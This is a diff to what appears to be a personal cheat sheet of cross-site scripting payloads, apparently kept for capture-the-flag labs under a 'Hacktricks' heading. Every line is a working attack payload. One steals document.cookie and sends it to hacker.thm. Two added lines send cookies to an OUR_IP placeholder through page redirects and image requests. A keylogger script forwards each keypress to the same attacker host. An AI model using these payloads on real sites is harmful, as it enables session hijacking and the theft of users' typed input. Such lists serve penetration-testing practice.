@@ -4,6 +4,11 @@ Hacktricks:
 
 steal cookie:
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+
+
 
 keylogger
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
